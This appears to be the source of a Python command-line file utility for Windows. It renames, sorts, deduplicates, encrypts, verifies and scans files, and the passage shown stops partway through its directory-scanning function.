#!/usr/bin/env python3
"""
Multitool v4.1
Author: Darnix (Original)
"""

# Standard library imports
import os
import shutil
import hashlib
import json
import time
import stat
import threading
import logging
import re
import random
import sys
import fnmatch
from pathlib import Path
from datetime import datetime, timedelta
import subprocess
import mimetypes
from typing import Dict, List, Tuple, Optional, Union, Any
import concurrent.futures
import socket  # Add if not already present
import requests  # Add this import
import ctypes
import winreg


# Third-party imports
import psutil
import platform
from cryptography.fernet import Fernet
from colorama import init, Fore, Back, Style
from tqdm import tqdm
import humanize
import keyboard
import pyautogui

# Windows-specific imports
try:
    import win32security
    import win32api
    import win32con
    import win32file
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
except ImportError:
    # Handle case when running on non-Windows platforms
    pass

# ...existing imports...
try:
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    pass
# ...existing code...

init(autoreset=True)

# Global constants
PROGRAM_NAME = "Multitool v4.1"
CHUNK_SIZE = 64 * 1024  # 64KB chunks for file operations
MAX_WORKERS = 4  # Maximum number of worker threads for parallel operations

# Third-party imports
import psutil
import platform
from cryptography.fernet import Fernet
from colorama import init, Fore, Back, Style
from tqdm import tqdm
import humanize
import keyboard
import pyautogui

# Windows-specific imports
try:
    import win32security
    import win32api
    import win32con
    import win32file
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
except ImportError:
    # Handle case when running on non-Windows platforms
    pass


def display_header():
    """Display the program header with formatting"""
    width = min(os.get_terminal_size().columns, 60)
    print(f"{Fore.CYAN}╔═{'═' * (width-4)}═╗")
    print(f"{Fore.CYAN}║ {Back.BLUE + Fore.WHITE + Style.BRIGHT}{PROGRAM_NAME.center(width-4)}{Style.RESET_ALL + Fore.CYAN} ║")
    print(f"{Fore.CYAN}║ {Fore.WHITE}Made by Darnix{' ' * (width-17)}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")

def display_menu_section(title, options, start_num):
    """Display a section of the menu with options"""
    width = min(os.get_terminal_size().columns, 60)
    print(f"{Fore.CYAN}║ {Fore.CYAN + Style.BRIGHT}{title}{' ' * (width-3-len(title))}║")
    print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")
    
    for i, option in enumerate(options, start=start_num):
        option_text = option[:40] if len(option) > 40 else option
        remaining_space = width - 3 - len(str(i)) - len(option_text) - 1
        print(f"{Fore.CYAN}║{Fore.YELLOW} {i}{Fore.WHITE} {option_text}{' ' * remaining_space}{Fore.CYAN}║")

def preview_file(filepath):
    """
    Display a preview of a file including metadata and content for text files
    
    Args:
        filepath (str): Path to the file to preview
    """
    try:
        mime_type, _ = mimetypes.guess_type(filepath)
        size = os.path.getsize(filepath)
        modified = os.path.getmtime(filepath)
        
        print(f"\n{Fore.CYAN}File Preview: {Fore.WHITE}{filepath}")
        print(f"{Fore.YELLOW}Type: {Fore.WHITE}{mime_type}")
        print(f"{Fore.YELLOW}Size: {Fore.WHITE}{humanize.naturalsize(size)}")
        print(f"{Fore.YELLOW}Modified: {Fore.WHITE}{datetime.fromtimestamp(modified)}")
        
        if mime_type and mime_type.startswith('text'):
            print(f"\n{Fore.CYAN}Content Preview:{Fore.WHITE}")
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                print(f.read(500) + "...")
    except Exception as e:
        print(f"{Fore.RED}Preview error: {e}")

def quick_actions():
    """Menu for quick file operations"""
    actions = [
        "Sort files by size (largest first)",
        "Sort files by date (newest first)",
        "Copy file list to clipboard",
        "Create Windows shortcut",
        "Back to main menu"
    ]
    
    while True:
        print(f"\n{Fore.CYAN}═══ Quick Actions Menu ═══")
        for i, action in enumerate(actions, 1):
            print(f"{Fore.YELLOW}{i}. {Fore.WHITE}{action}")
            
        print(f"\n{Fore.CYAN}What would you like to do?")
        choice = input(f"{Fore.GREEN}Enter your choice (1-5): {Fore.WHITE}")
        
        if choice == "1":
            files = [(f, os.path.getsize(f)) for f in os.listdir() if os.path.isfile(f)]
            files.sort(key=lambda x: x[1], reverse=True)
            print(f"\n{Fore.CYAN}Files in current directory, sorted by size:")
            for file, size in files:
                print(f"{Fore.WHITE}{humanize.naturalsize(size):>10} - {file}")
                
        elif choice == "2":
            files = [(f, os.path.getmtime(f)) for f in os.listdir() if os.path.isfile(f)]
            files.sort(key=lambda x: x[1], reverse=True)
            print(f"\n{Fore.CYAN}Files in current directory, sorted by date:")
            for file, mtime in files:
                print(f"{Fore.WHITE}{datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M:%S')} - {file}")

        elif choice == "3":
            file_list = "\n".join(os.listdir())
            import pyperclip
            pyperclip.copy(file_list)
            print(f"{Fore.GREEN}✓ List of {len(os.listdir())} files copied to clipboard!")
            
        elif choice == "4":
            if os.name == 'nt':
                target = input(f"{Fore.YELLOW}Enter name of file/folder to create shortcut for: {Fore.WHITE}")
                if os.path.exists(target):
                    import winshell
                    from win32com.client import Dispatch
                    shortcut = os.path.splitext(target)[0] + ".lnk"
                    shell = Dispatch('WScript.Shell')
                    link = shell.CreateShortCut(shortcut)
                    link.Targetpath = os.path.abspath(target)
                    link.save()
                    print(f"{Fore.GREEN}✓ Shortcut created: {shortcut}")
                else:
                    print(f"{Fore.RED}× Target not found in current directory!")
            else:
                print(f"{Fore.RED}× Shortcuts only supported on Windows!")
                
        elif choice == "5":
            break
        else:
            print(f"{Fore.RED}× Invalid choice!")
        
        if choice != "5":
            input(f"\n{Fore.CYAN}Press Enter to continue...")

def get_file_hash(filepath: str, algorithm: str = 'md5') -> Optional[str]:
    """
    Calculate hash of a file using efficient buffered reading.
    
    Args:
        filepath (str): Path to the file
        algorithm (str): Hash algorithm to use ('md5', 'sha1', 'sha256')
        
    Returns:
        Optional[str]: Hexadecimal hash of the file or None if error
    """
    if algorithm == 'md5':
        hasher = hashlib.md5()
    elif algorithm == 'sha1':
        hasher = hashlib.sha1()
    elif algorithm == 'sha256':
        hasher = hashlib.sha256()
    else:
        print(f"{Fore.RED}Unsupported hash algorithm: {algorithm}")
        return None
        
    try:
        with open(filepath, 'rb') as f:
            buf = f.read(CHUNK_SIZE)
            while len(buf) > 0:
                hasher.update(buf)
                buf = f.read(CHUNK_SIZE)
        return hasher.hexdigest()
    except (PermissionError, FileNotFoundError) as e:
        print(f"{Fore.RED}Error hashing file {filepath}: {str(e)}")
        return None

def search_files(directory, pattern, use_regex=False):
    """
    Search for files in a directory that match a pattern.
    
    Args:
        directory (str): Directory to search in
        pattern (str): Pattern to match against filenames
        use_regex (bool): Whether to use regex matching instead of substring matching
        
    Returns:
        list: List of matching file paths
    """
    found_files = []
    try:
        if use_regex:
            regex = re.compile(pattern, re.IGNORECASE)
            
        for root, _, files in os.walk(directory):
            for file in files:
                if use_regex:
                    if regex.search(file):
                        found_files.append(os.path.join(root, file))
                else:
                    if pattern.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
        return found_files
    except Exception as e:
        print(f"{Fore.RED}Error searching files: {str(e)}")
        return []

def find_duplicates(directory: str) -> Dict[str, List[str]]:
    """
    Find duplicate files in a directory by comparing file hashes.
    Uses parallel processing for improved performance.
    
    Args:
        directory (str): Directory to scan for duplicates
        
    Returns:
        Dict[str, List[str]]: Dictionary mapping file hashes to lists of duplicate file paths
    """
    print(f"{Fore.YELLOW}Scanning for duplicates (this might take a while)...")
    hash_dict = {}
    size_dict = {}  # Group files by size first for optimization
    
    try:
        # First pass: group files by size (files of different sizes cannot be duplicates)
        print(f"{Fore.CYAN}Phase 1: Grouping files by size...")
        for root, _, files in os.walk(directory):
            for filename in files:
                try:
                    filepath = os.path.join(root, filename)
                    file_size = os.path.getsize(filepath)
                    
                    # Skip empty files
                    if file_size == 0:
                        continue
                    
                    if file_size in size_dict:
                        size_dict[file_size].append(filepath)
                    else:
                        size_dict[file_size] = [filepath]
                except (PermissionError, OSError, FileNotFoundError):
                    continue
        
        # Filter out unique file sizes
        potential_duplicates = {size: files for size, files in size_dict.items() if len(files) > 1}
        total_files_to_hash = sum(len(files) for files in potential_duplicates.values())
        
        if total_files_to_hash == 0:
            print(f"{Fore.GREEN}No potential duplicates found based on file size.")
            return {}
            
        print(f"{Fore.CYAN}Phase 2: Hashing {total_files_to_hash} potential duplicate files...")
        
        # Function to hash files in parallel
        def hash_file_group(file_group):
            results = []
            for filepath in file_group:
                file_hash = get_file_hash(filepath)
                if file_hash:
                    results.append((file_hash, filepath))
            return results
        
        # Process files in parallel
        processed = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # Split work into chunks for each worker
            all_files = [filepath for files in potential_duplicates.values() for filepath in files]
            chunk_size = max(1, len(all_files) // MAX_WORKERS)
            file_chunks = [all_files[i:i + chunk_size] for i in range(0, len(all_files), chunk_size)]
            
            # Submit tasks
            future_to_chunk = {executor.submit(hash_file_group, chunk): i for i, chunk in enumerate(file_chunks)}
            
            # Process results as they complete
            for future in concurrent.futures.as_completed(future_to_chunk):
                chunk_results = future.result()
                for file_hash, filepath in chunk_results:
                    if file_hash in hash_dict:
                        hash_dict[file_hash].append(filepath)
                    else:
                        hash_dict[file_hash] = [filepath]
                
                processed += len(chunk_results)
                progress = (processed / total_files_to_hash) * 100
                print(f"Progress: {processed}/{total_files_to_hash} files hashed ({progress:.1f}%)\r", end="")
        
        # Filter out unique files
        duplicate_dict = {k: v for k, v in hash_dict.items() if len(v) > 1}
        duplicate_count = sum(len(v)-1 for v in duplicate_dict.values())
        
        print(f"\n{Fore.GREEN}Scan complete! Found {duplicate_count} duplicate files in {len(duplicate_dict)} groups.")
        return duplicate_dict
        
    except Exception as e:
        print(f"{Fore.RED}Error finding duplicates: {str(e)}")
        return {}

def analyze_disk_space(directory):
    """
    Analyze disk space usage by file extension in a directory
    
    Args:
        directory (str): Directory to analyze
        
    Returns:
        dict: Dictionary mapping file extensions to total size in bytes
    """
    size_dict = {}
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                size = os.path.getsize(filepath)
                ext = os.path.splitext(file)[1].lower()
                size_dict[ext] = size_dict.get(ext, 0) + size
            except OSError:
                continue
    return size_dict

def create_folder(directory, folder_name):
    """
    Create a folder if it doesn't exist
    
    Args:
        directory (str): Parent directory
        folder_name (str): Name of the folder to create
        
    Returns:
        str: Path to the created folder
    """
    folder_path = os.path.join(directory, folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    return folder_path

def organize_files(directory):
    """
    Organize files in a directory into category folders based on file extensions
    
    Args:
        directory (str): Directory to organize
    """
    CATEGORIES = {
        'Images': {
            'extensions': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'],
            'description': 'Picture files and graphics'
        },
        'Documents': {
            'extensions': ['.pdf', '.doc', '.docx', '.txt', '.xlsx', '.csv', '.rtf', '.odt'],
            'description': 'Text and document files'
        },
        'Audio': {
            'extensions': ['.mp3', '.wav', '.flac', '.m4a', '.ogg', '.aac'],
            'description': 'Music and sound files'
        },
        'Video': {
            'extensions': ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm'],
            'description': 'Movie and video files'
        },
        'Archives': {
            'extensions': ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2'],
            'description': 'Compressed files and archives'
        },
        'Code': {
            'extensions': ['.py', '.java', '.cpp', '.html', '.css', '.js', '.php'],
            'description': 'Programming and script files'
        }
    }
    
    try:
        moved_files = 0
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            if os.path.isfile(filepath):
                file_ext = os.path.splitext(filename)[1].lower()
                for category, info in CATEGORIES.items():
                    if file_ext in info['extensions']:
                        category_path = create_folder(directory, category)
                        shutil.move(filepath, os.path.join(category_path, filename))
                        moved_files += 1
                        print(f"Moved {filename} to {category} ({info['description']})")
                        break
        print(f"\nOrganization complete! Moved {moved_files} files.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def rename_files(directory, pattern, replacement):
    """
    Rename files in a directory by replacing a pattern in filenames
    
    Args:
        directory (str): Directory containing files to rename
        pattern (str): Pattern to search for in filenames
        replacement (str): Text to replace the pattern with
        
    Returns:
        int: Number of files renamed
    """
    renamed = 0
    for filename in os.listdir(directory):
        if pattern in filename:
            new_name = filename.replace(pattern, replacement)
            old_path = os.path.join(directory, filename)
            new_path = os.path.join(directory, new_name)
            os.rename(old_path, new_path)
            renamed += 1
    return renamed

def auto_rename():
    """
    Bulk rename files with various options
    
    Returns:
        int: Number of files renamed
    """
    print(f"{Fore.CYAN}Bulk File Renaming")
    print(f"{Fore.CYAN}{'=' * 60}\n")
    
    print(f"{Fore.YELLOW}Rename Options:")
    print(f"{Fore.WHITE}1. Replace text in filenames")
    print(f"{Fore.WHITE}2. Add prefix to filenames")
    print(f"{Fore.WHITE}3. Add suffix to filenames (before extension)")
    print(f"{Fore.WHITE}4. Number files sequentially")
    print(f"{Fore.WHITE}5. Convert to lowercase/uppercase")
    print(f"{Fore.WHITE}6. Remove spaces")
    print(f"{Fore.WHITE}7. Cancel")
    
    choice = input(f"\n{Fore.GREEN}Choose option (1-7): {Fore.WHITE}")
    
    if choice == "7":
        return 0
        
    # Get files to rename
    file_filter = input(f"{Fore.YELLOW}Enter file filter (e.g., *.jpg) or leave empty for all files: {Fore.WHITE}")
    
    files = []
    if file_filter:
        for file in os.listdir():
            if os.path.isfile(file) and fnmatch.fnmatch(file, file_filter):
                files.append(file)
    else:
        files = [f for f in os.listdir() if os.path.isfile(f)]
    
    if not files:
        print(f"{Fore.RED}No matching files found!")
        return 0
    
    print(f"\n{Fore.CYAN}Found {len(files)} files to rename.")
    
    renamed = 0
    if choice == "1":
        pattern = input(f"{Fore.YELLOW}Enter text to replace: {Fore.WHITE}")
        replacement = input(f"{Fore.YELLOW}Enter replacement text: {Fore.WHITE}")
        
        for file in files:
            if pattern in file:
                new_name = file.replace(pattern, replacement)
                try:
                    os.rename(file, new_name)
                    print(f"{Fore.GREEN}Renamed: {file} → {new_name}")
                    renamed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error renaming {file}: {e}")
    
    elif choice == "2":
        prefix = input(f"{Fore.YELLOW}Enter prefix to add: {Fore.WHITE}")
        
        for file in files:
            new_name = prefix + file
            try:
                os.rename(file, new_name)
                print(f"{Fore.GREEN}Renamed: {file} → {new_name}")
                renamed += 1
            except Exception as e:
                print(f"{Fore.RED}Error renaming {file}: {e}")
    
    elif choice == "3":
        suffix = input(f"{Fore.YELLOW}Enter suffix to add: {Fore.WHITE}")
        
        for file in files:
            name, ext = os.path.splitext(file)
            new_name = name + suffix + ext
            try:
                os.rename(file, new_name)
                print(f"{Fore.GREEN}Renamed: {file} → {new_name}")
                renamed += 1
            except Exception as e:
                print(f"{Fore.RED}Error renaming {file}: {e}")
    
    elif choice == "4":
        start_num = int(input(f"{Fore.YELLOW}Enter starting number: {Fore.WHITE}"))
        padding = int(input(f"{Fore.YELLOW}Enter digit padding (e.g., 3 for 001): {Fore.WHITE}"))
        keep_name = input(f"{Fore.YELLOW}Keep original filename? (y/n): {Fore.WHITE}").lower() == 'y'
        
        for i, file in enumerate(sorted(files), start_num):
            name, ext = os.path.splitext(file)
            if keep_name:
                new_name = f"{i:0{padding}d}_{name}{ext}"
            else:
                new_name = f"{i:0{padding}d}{ext}"
            try:
                os.rename(file, new_name)
                print(f"{Fore.GREEN}Renamed: {file} → {new_name}")
                renamed += 1
            except Exception as e:
                print(f"{Fore.RED}Error renaming {file}: {e}")
    
    elif choice == "5":
        case_choice = input(f"{Fore.YELLOW}Convert to (l)owercase or (u)ppercase? (l/u): {Fore.WHITE}").lower()
        
        for file in files:
            if case_choice == 'l':
                new_name = file.lower()
            elif case_choice == 'u':
                new_name = file.upper()
            else:
                print(f"{Fore.RED}Invalid choice!")
                return 0
                
            if new_name != file:
                try:
                    os.rename(file, new_name)
                    print(f"{Fore.GREEN}Renamed: {file} → {new_name}")
                    renamed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error renaming {file}: {e}")
    
    elif choice == "6":
        replace_with = input(f"{Fore.YELLOW}Replace spaces with (leave empty to remove): {Fore.WHITE}")
        
        for file in files:
            if ' ' in file:
                new_name = file.replace(' ', replace_with)
                try:
                    os.rename(file, new_name)
                    print(f"{Fore.GREEN}Renamed: {file} → {new_name}")
                    renamed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error renaming {file}: {e}")
    
    return renamed

def get_drives():
    """
    Get a list of available drives on Windows
    
    Returns:
        list: List of drive letters with paths (e.g., ['C:\\', 'D:\\'])
    """
    from ctypes import windll
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in range(65, 91):
        if bitmask & (1 << (letter - 65)):
            drives.append(chr(letter) + ":\\")
    return drives

def change_directory():
    """Interactive directory navigation function"""
    while True:
        current_dir = os.getcwd()
        print(f"\nCurrent directory: {current_dir}")
        print("\nOptions:")
        print("1. Go to parent directory")
        print("2. Select subdirectory")
        print("3. Go to specific drive")
        print("4. Enter custom path")
        print("5. Return to main menu")
        
        choice = input("\nEnter choice (1-5): ")
        
        if choice == '1':
            parent = os.path.dirname(current_dir)
            if os.path.exists(parent):
                os.chdir(parent)
        
        elif choice == '2':
            try:
                subdirs = [d for d in os.listdir(current_dir) 
                          if os.path.isdir(os.path.join(current_dir, d))]
                if not subdirs:
                    print("No subdirectories found!")
                    continue
                    
                print("\nAvailable subdirectories:")
                for i, d in enumerate(subdirs, 1):
                    print(f"{i}. {d}")
                    
                idx = int(input("\nSelect directory number: ")) - 1
                if 0 <= idx < len(subdirs):
                    new_dir = os.path.join(current_dir, subdirs[idx])
                    os.chdir(new_dir)
            except (ValueError, IndexError):
                print("Invalid selection!")
        
        elif choice == '3':
            drives = get_drives()
            print("\nAvailable drives:")
            for i, drive in enumerate(drives, 1):
                print(f"{i}. {drive}")
            try:
                idx = int(input("\nSelect drive number: ")) - 1
                if 0 <= idx < len(drives):
                    os.chdir(drives[idx])
            except (ValueError, IndexError):
                print("Invalid selection!")
        
        elif choice == '4':
            custom_path = input("Enter full path: ")
            if os.path.exists(custom_path):
                os.chdir(custom_path)
            else:
                print("Invalid path!")
        
        elif choice == '5':
            break

def get_system_info():
    """
    Get detailed system information
    
    Returns:
        dict: Dictionary containing system information
    """
    try:
        info = {
            "OS": f"{platform.system()} {platform.release()}",
            "CPU": platform.processor(),
            "RAM Total": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "RAM Available": f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
            "Disk Usage": {}
        }
        
        for partition in psutil.disk_partitions():
            if 'fixed' in partition.opts:
                usage = psutil.disk_usage(partition.mountpoint)
                info["Disk Usage"][partition.mountpoint] = (
                    f"{usage.used / (1024**3):.1f}GB used / "
                    f"{usage.total / (1024**3):.1f}GB total "
                    f"({usage.percent}% full)"
                )
        return info
    except Exception as e:
        return f"Error getting system info: {str(e)}"

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_categories():
    """Display file categories and their associated extensions"""
    CATEGORIES = {
        'Images': {
            'extensions': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'],
            'description': 'Picture files and graphics'
        },
        'Documents': {
            'extensions': ['.pdf', '.doc', '.docx', '.txt', '.xlsx', '.csv', '.rtf', '.odt'],
            'description': 'Text and document files'
        },
        'Audio': {
            'extensions': ['.mp3', '.wav', '.flac', '.m4a', '.ogg', '.aac'],
            'description': 'Music and sound files'
        },
        'Video': {
            'extensions': ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm'],
            'description': 'Movie and video files'
        },
        'Archives': {
            'extensions': ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2'],
            'description': 'Compressed files and archives'
        },
        'Code': {
            'extensions': ['.py', '.java', '.cpp', '.html', '.css', '.js', '.php'],
            'description': 'Programming and script files'
        }
    }
    
    try:
        print("\nFile Categories and Extensions:")
        for category, info in CATEGORIES.items():
            print(f"\n{category}:")
            print(f"Description: {info['description']}")
            print(f"Extensions: {', '.join(info['extensions'])}")
        input("\nPress Enter to continue...")
    except Exception as e:
        print(f"Error displaying categories: {str(e)}")

def encrypt_file(filepath: str, key: Optional[bytes] = None, key_path: Optional[str] = None) -> Optional[bytes]:
    """
    Encrypt a file using Fernet symmetric encryption with progress reporting.
    
    Args:
        filepath (str): Path to the file to encrypt
        key (bytes, optional): Encryption key to use. If None, a new key is generated.
        key_path (str, optional): Path to save the encryption key. If None, saves to current directory.
        
    Returns:
        Optional[bytes]: The encryption key used or None if error
    """
    try:
        if not os.path.exists(filepath):
            print(f"{Fore.RED}File not found: {filepath}")
            return None
            
        # Generate or use provided key
        if not key:
            key = Fernet.generate_key()
            key_file = key_path or os.path.join(os.path.dirname(filepath), 'encryption_key.key')
            
            # Ensure the key is stored securely
            try:
                with open(key_file, 'wb') as f:
                    f.write(key)
                
                # On Windows, try to make the key file hidden
                if os.name == 'nt':
                    try:
                        import win32api, win32con
                        win32api.SetFileAttributes(key_file, win32con.FILE_ATTRIBUTE_HIDDEN)
                    except ImportError:
                        pass
                        
                print(f"{Fore.GREEN}Encryption key saved to {key_file}")
                print(f"{Fore.YELLOW}IMPORTANT: Keep this key safe. Without it, you cannot decrypt the file.")
                
            except Exception as e:
                print(f"{Fore.RED}Warning: Could not save key file: {str(e)}")
                print(f"{Fore.YELLOW}Key: {key.decode()}")
        
        # Create Fernet cipher
        f = Fernet(key)
        
        # Get file size for progress reporting
        file_size = os.path.getsize(filepath)
        output_file = filepath + '.encrypted'
        
        # Read file in chunks to handle large files
        with open(filepath, 'rb') as infile, open(output_file, 'wb') as outfile:
            processed = 0
            
            while True:
                chunk = infile.read(CHUNK_SIZE)
                if not chunk:
                    break
                    
                encrypted_chunk = f.encrypt(chunk)
                outfile.write(encrypted_chunk)
                
                processed += len(chunk)
                progress = (processed / file_size) * 100
                print(f"Encrypting: {progress:.1f}% complete\r", end="")
                
        print(f"\n{Fore.GREEN}File encrypted successfully: {output_file}")
        
        # Ask if user wants to delete the original file
        if input(f"{Fore.YELLOW}Delete original file? (y/n): {Fore.WHITE}").lower() == 'y':
            try:
                os.remove(filepath)
                print(f"{Fore.GREEN}Original file deleted.")
            except Exception as e:
                print(f"{Fore.RED}Could not delete original file: {str(e)}")
                
        return key
        
    except Exception as e:
        print(f"{Fore.RED}Error encrypting file: {str(e)}")
        return None

def decrypt_file(filepath, key, output_path=None):
    """
    Decrypt a file that was encrypted with Fernet.
    
    Args:
        filepath (str): Path to the encrypted file
        key (bytes): Decryption key
        output_path (str, optional): Custom output path for decrypted file
        
    Returns:
        bool: True if decryption was successful, False otherwise
    """
    try:
        if not os.path.exists(filepath):
            print(f"{Fore.RED}File not found: {filepath}")
            return False
            
        # Create Fernet cipher
        f = Fernet(key)
        
        # Determine output filename
        if output_path:
            output_file = output_path
        else:
            output_file = filepath.replace('.encrypted', '.decrypted')
        
        # Read and decrypt in chunks
        with open(filepath, 'rb') as infile, open(output_file, 'wb') as outfile:
            chunk_size = 64 * 1024  # 64KB chunks
            while True:
                chunk = infile.read(chunk_size)
                if not chunk:
                    break
                try:
                    decrypted_chunk = f.decrypt(chunk)
                    outfile.write(decrypted_chunk)
                except Exception as e:
                    print(f"{Fore.RED}Decryption failed: {str(e)}")
                    os.remove(output_file)  # Clean up partial file
                    return False
                    
        print(f"{Fore.GREEN}File decrypted successfully: {output_file}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Error decrypting file: {str(e)}")
        return False

def verify_file_integrity(filepath: str) -> Tuple[bool, str]:
    """
    Verify the integrity of a file by checking its structure and content.
    Enhanced with more file formats and detailed checks.
    
    Args:
        filepath (str): Path to the file to verify
        
    Returns:
        Tuple[bool, str]: Success status and message
    """
    try:
        # Extended magic numbers dictionary with more file formats
        MAGIC_NUMBERS = {
            # Images
            '.jpg': (b'\xFF\xD8\xFF', 3),
            '.jpeg': (b'\xFF\xD8\xFF', 3),
            '.png': (b'\x89PNG\r\n\x1A\n', 8),
            '.gif': (b'GIF8', 4),
            '.bmp': (b'BM', 2),
            '.webp': (b'RIFF', 4),
            '.tiff': (b'\x49\x49\x2A\x00', 4),
            
            # Documents
            '.pdf': (b'%PDF', 4),
            '.docx': (b'PK\x03\x04', 4),
            '.xlsx': (b'PK\x03\x04', 4),
            '.pptx': (b'PK\x03\x04', 4),
            
            # Archives
            '.zip': (b'PK\x03\x04', 4),
            '.rar': (b'Rar!\x1A\x07', 6),
            '.7z': (b'7z\xBC\xAF\x27\x1C', 6),
            '.gz': (b'\x1F\x8B\x08', 3),
            '.tar': (b'ustar', 5),
            
            # Audio/Video
            '.mp3': (b'ID3', 3),
            '.mp4': (b'ftyp', 4),
            '.avi': (b'RIFF', 4),
            '.wav': (b'RIFF', 4),
            '.flac': (b'fLaC', 4),
            
            # Executables
            '.exe': (b'MZ', 2),
            '.dll': (b'MZ', 2),
            
            # Other
            '.xml': (b'<?xml', 5),
            '.html': (b'<!DOC', 5),
            '.json': (b'{', 1)
        }
        
        # Check if file exists
        if not os.path.exists(filepath):
            return False, "File does not exist"
            
        # Get file size
        file_size = os.path.getsize(filepath)
            
        # Check if file is empty
        if file_size == 0:
            return False, "File is empty"
            
        # Check file permissions
        if not os.access(filepath, os.R_OK):
            return False, "File is not readable (permission denied)"
            
        # Check file header (magic numbers)
        ext = os.path.splitext(filepath)[1].lower()
        if ext in MAGIC_NUMBERS:
            magic, length = MAGIC_NUMBERS[ext]
            with open(filepath, 'rb') as f:
                file_start = f.read(length)
                if not file_start.startswith(magic):
                    return False, f"Invalid file header for {ext} format"
        
        # Calculate file hash for integrity check
        file_hash = get_file_hash(filepath, 'sha256')
        if not file_hash:
            return False, "Could not calculate file hash"
            
        # Try to read the entire file to check for read errors
        try:
            with open(filepath, 'rb') as f:
                # Read in chunks to handle large files
                processed = 0
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    processed += len(chunk)
                    
                    # Update progress for large files
                    if file_size > 10 * 1024 * 1024:  # 10MB
                        progress = (processed / file_size) * 100
                        print(f"Verifying: {progress:.1f}% complete\r", end="")
                        
                # Verify we read the entire file
                if processed != file_size:
                    return False, f"File size mismatch: expected {file_size}, read {processed} bytes"
        except Exception as e:
            return False, f"Read error: {str(e)}"
            
        # Additional checks for specific file types
        if ext == '.zip':
            try:
                import zipfile
                if not zipfile.is_zipfile(filepath):
                    return False, "Not a valid ZIP archive"
                with zipfile.ZipFile(filepath) as zf:
                    if zf.testzip() is not None:
                        return False, "ZIP file is corrupted"
            except ImportError:
                pass
                
        elif ext in ['.jpg', '.jpeg', '.png', '.gif']:
            try:
                from PIL import Image
                try:
                    with Image.open(filepath) as img:
                        img.verify()
                except Exception:
                    return False, f"Image file is corrupted or invalid"
            except ImportError:
                pass
                
        return True, f"File integrity check passed (SHA256: {file_hash})"
        
    except Exception as e:
        return False, f"Verification error: {str(e)}"
def scan_directory(directory: str) -> Dict[str, List[str]]:
    """
    Enhanced scan of a directory for potential issues and security concerns.
    Includes more comprehensive checks and parallel processing for large directories.
    
    Args:
        directory (str): Directory to scan
        
    Returns:
        Dict[str, List[str]]: Dictionary of issues found by category
    """
    issues = {
        "security": [],
        "storage": [],
        "suspicious": [],
        "recommendations": [],
        "performance": []
    }
    
    total_size = 0
    large_files = []
    old_files = []
    hidden_files = []
    suspicious_extensions = ['.exe', '.dll', '.bat', '.ps1', '.vbs', '.js', '.jar', '.sh', '.py']
    suspicious_patterns = ['backdoor', 'hack', 'crack', 'keygen', 'password', 'admin']
    
    print(f"{Fore.YELLOW}Scanning directory: {directory}")
    print(f"{Fore.CYAN}This may take a while for large directories...")
    
    # Function to scan a single file
    def scan_file(path):
        file_issues = {
            "security": [],
            "storage": [],
            "suspicious": [],
            "performance": []
        }
        
        try:
            name = os.path.basename(path)
            rel_path = os.path.relpath(path, directory)
            size = os.path.getsize(path)
            
            # Check file size
            if size > 100 * 1024 * 1024:  # 100MB
                large_files.append((path, size))
            
            if size == 0:
                file_issues["storage"].append(f"Empty file found: {rel_path}")
            
            # Check file age
            mtime = os.path.getmtime(path)
            age_days = (time.time() - mtime) / 86400
            if age_days > 365:  # Older than 1 year
                old_files.append((path, age_days))
            
            # Check for hidden files
            if name.startswith('.') or (os.name == 'nt' and bool(os.stat(path).st_file_attributes & stat.FILE_ATTRIBUTE_HIDDEN)):
                hidden_files.append(path)
            
            # Check suspicious extensions
            if any(name.lower().endswith(ext) for ext in suspicious_extensions):
                file_issues["suspicious"].append(
                    f"Potentially sensitive file found: {rel_path}"
                )
            
            # Check suspicious patterns in filename
            if any(pattern in name.lower() for pattern in suspicious_patterns):
                file_issues["suspicious"].append(
                    f"Suspicious filename pattern: {rel_path}"
                )
            
            # Check file permissions
            if not os.access(path, os.R_OK):
                file_issues["security"].append(f"No read access to: {rel_path}")
            
            if os.name == 'nt' and os.access(path, os.X_OK) and name.lower().endswith(('.txt', '.doc', '.pdf', '.jpg')):
                file_issues["security"].append(f"Unusual execute permission on non-executable: {rel_path}")
            
            # Check for potential malware signatures in executable files
            if name.lower().endswith('.exe') and size < 100 * 1024:  # Small executables
                file_issues["suspicious"].append(f"Unusually small executable: {rel_path}")
            
            # Performance issues
            if name.endswith(('.log', '.tmp')) and size > 10 * 1024 * 1024:  # 10MB
                file_issues["performance"].append(f"Large log/temp file: {rel_path} ({humanize.naturalsize(size)})")
            
            return file_issues, size
            
        except Exception as e:
            return {"error": [f"Error scanning {os.path.basename(path)}: {str(e)}"]}, 0
    
    # Collect all files first
    all_files = []
    for root, dirs, files in os.walk(directory):
        for name in files:
            all_files.append(os.path.join(root, name))
    
    # Process files in parallel for large directories
    if len(all_files) > 100:
